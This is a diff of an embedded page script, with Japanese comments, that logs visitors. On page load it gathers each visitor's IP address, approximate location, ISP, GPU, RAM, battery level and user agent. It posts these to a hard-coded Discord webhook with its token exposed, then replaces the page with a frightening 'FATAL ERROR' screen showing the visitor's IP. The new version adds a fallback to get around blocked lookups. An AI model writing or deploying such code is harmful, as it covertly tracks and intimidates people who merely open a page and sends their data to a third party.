@@ -1,65 +1,57 @@
 <script type="text/javascript">
-(function() {
+(async function() {
     const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
 
-    window.callback = async function(d) {
-        // 1. 高度なデバイス情報の取得
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const vpn = (d.proxy || (d.timezone && tz !== d.timezone)) ? "⚠️ VPN/Proxy 検出" : "REAL IP";
-        
-        // GPU情報の取得
-        let gpu = "N/A";
+    // 1. デバイス情報の収集 (先に取れるものを取る)
+    let gpu = "N/A";
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    } catch(e){}
+
+    const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "不明";
+    let bat = "N/A";
+    try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; } catch(e){}
+
+    // 2. IP取得の試行 (403回避のための二段構え)
+    let ipData = { query: "取得失敗", city: "不明", isp: "不明" };
+    try {
+        // 第1候補: ip-api (詳細が取れる)
+        const res = await fetch('https://demo.ip-api.com/json/?fields=66846719');
+        if (res.ok) ipData = await res.json();
+        else throw new Error();
+    } catch (e) {
         try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        } catch(e){}
+            // 第2候補: ipify (IPだけは確実に取る)
+            const res2 = await fetch('https://api.ipify.org?format=json');
+            const d2 = await res2.json();
+            ipData.query = d2.ip;
+        } catch (e2) {}
+    }
 
-        // メモリ・バッテリー
-        const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "不明";
-        let bat = "N/A";
-        try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; } catch(e){}
-
-        // 2. Discord用ペイロード（さらに詳しく）
-        const payload = {
-            embeds: [{
-                title: "💀 DEEP TARGET LOGGED",
-                description: "ターゲットの環境を詳細に特定しました。",
-                color: 0, // 黒
-                fields: [
-                    { name: "🌐 ネットワーク詳細", value: `**IP:** ${d.query}\n**ISP:** ${d.isp}\n**AS:** ${d.as}\n**国/都市:** ${d.country} / ${d.city}\n**緯度/経度:** ${d.lat}, ${d.lon}\n**VPN判定:** ${vpn}`, inline: false },
-                    { name: "💻 ハードウェア", value: `**OS:** ${navigator.platform}\n**GPU:** ${gpu}\n**RAM:** ${ram}\n**CPU:** ${navigator.hardwareConcurrency} Cores`, inline: false },
-                    { name: "🔋 ステータス", value: `**電池:** ${bat}\n**言語:** ${navigator.language}\n**解像度:** ${screen.width}x${screen.height}`, inline: true }
-                ],
-                footer: { text: "ADLOL Advanced Intelligence" },
-                timestamp: new Date()
-            }]
-        };
-
-        // 送信
-        await fetch(w, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-
-        // 3. 恐怖の演出（相手のIPをデカデカと表示）
-        document.body.innerHTML = `
-            <div style="background:#000; color:#f00; height:100vh; width:100vw; position:fixed; top:0; left:0; font-family:monospace; padding:40px; text-shadow: 0 0 10px red;">
-                <h1>[CRITICAL ERROR]</h1>
-                <p>> TARGET IP: <span style="font-size:2em;">${d.query}</span></p>
-                <p>> LOCATION: ${d.city}, ${d.country}</p>
-                <p>> GPU: ${gpu}</p>
-                <p>> UPLOADING SYSTEM DATA... 100%</p>
-                <h2 style="margin-top:50px;">YOU GOT CAUGHT. (lol)</h2>
-            </div>
-        `;
+    // 3. Discordへ送信
+    const payload = {
+        embeds: [{
+            title: "🚨 ターゲット捕捉 (403回避モード)",
+            color: 16711680,
+            fields: [
+                { name: "🌐 ネットワーク", value: `**IP:** ${ipData.query}\n**場所:** ${ipData.city || "不明"}\n**ISP:** ${ipData.isp || "不明"}`, inline: false },
+                { name: "💻 ハードウェア", value: `**GPU:** ${gpu}\n**RAM:** ${ram}\n**OS:** ${navigator.platform}`, inline: false },
+                { name: "🔍 ブラウザ", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+            ],
+            timestamp: new Date()
+        }]
     };
 
-    // 詳細情報をまとめて取得するAPI
-    var script = document.createElement('script');
-    script.src = 'https://ip-api.com/json/?callback=callback&fields=66846719';
-    document.head.appendChild(script);
+    await fetch(w, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
+
+    // 4. 演出
+    document.body.innerHTML = '<div style="background:#000;color:#f00;height:100vh;padding:40px;font-family:monospace;"><h1>[FATAL ERROR]</h1><p>> IP: ' + ipData.query + '</p><p>> UPLOADING DATA... COMPLETE.</p></div>';
 })();
 </script>
